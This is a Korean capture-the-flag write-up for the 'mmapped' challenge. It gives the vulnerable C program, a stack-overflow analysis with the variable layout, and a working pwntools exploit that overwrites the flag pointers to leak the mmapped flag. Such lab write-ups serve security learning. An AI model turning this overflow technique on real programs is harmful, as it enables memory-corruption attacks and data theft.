# mmapped

## 소스코드 분석

```c
// Name: chall.c
// Compile: gcc -fno-stack-protector chall.c -o chall

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>

#define FLAG_SIZE 0x45

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);
}

int main(int argc, char *argv[]) {
    int len;
    char * fake_flag_addr;
    char buf[0x20];
    int fd;
    char * real_flag_addr;

    initialize();

    fd = open("./flag", O_RDONLY);
    len = FLAG_SIZE;
    fake_flag_addr = "DH{****************************************************************}";

    printf("fake flag address: %p\n", fake_flag_addr);
    printf("buf address: %p\n", buf);

    real_flag_addr = (char *)mmap(NULL, FLAG_SIZE, PROT_READ, MAP_PRIVATE, fd, 0);
    printf("real flag address (mmapped address): %p\n", real_flag_addr);

    printf("%s", "input: ");
    read(0, buf, 60);

    mprotect(real_flag_addr, len, PROT_NONE);

    write(1, fake_flag_addr, FLAG_SIZE);
    printf("\nbuf value: ");
    puts(buf);

    munmap(real_flag_addr, FLAG_SIZE);
    close(fd);

    return 0;
}
```

## 취약점 분석

buf의 사이즈는 0x20(32바이트)이지만 60바이트 사이즈 만큼 입력을 받는다. 이를 통해 스택오버플로우를 발생시킬 수 있다.

## 익스플로잇 구상하기

### mprotect

`mprotect`는 메모리의 권한을 제어하는 시스템 콜이다. 

즉 단순히 fake_flag_addr만 real_flag_addr로 바꿔서는 mprotect로 인해서 real_flag_addr의 주소에 접근을 할 수 없다.

### 메모리 구조 파악하기

gdb를 통해 메모리를 확인한 결과 변수들은 메모리에 다음과 같이 저장된다.

- `rbp-0x40 ~ rbp-0x20`: buf (32바이트)
- `rbp-0x20 ~ rbp-0x18`: 빈 공간 (8바이트)
- `rbp-0x18 ~ rbp-0x10`: real_flag_addr (8바이트)
- `rbp-0x10 ~ rbp-0x08`: fake_flag_addr (8바이트)
- `rbp-0x08 ~ rbp-0x04`: len (4바이트)
- `rbp-0x04 ~ rbp-0x00`: fd (4바이트)

즉, 버퍼로 부터 60바이트를 작성할 수 있기 때문에 buf부터 len까지 값을 덮어 쓸 수 있다.

## 익스플로잇 코드 

```python
from pwn import *
import sys

if len(sys.argv) == 3:
    p = remote(sys.argv[1], int(sys.argv[2]))
else:
    p = process('./chall')

p.recvuntil(b"real flag address (mmapped address): ")
real_flag_addr = int(p.recvline().strip(), 16)

p.recvuntil(b"input: ")

payload = b'A' * 32
payload += b'B' * 8
payload += b'C' * 8
payload += p64(real_flag_addr)

p.send(payload)

result = p.recvall(timeout=2).decode('utf-8', 'ignore')
print(result)
```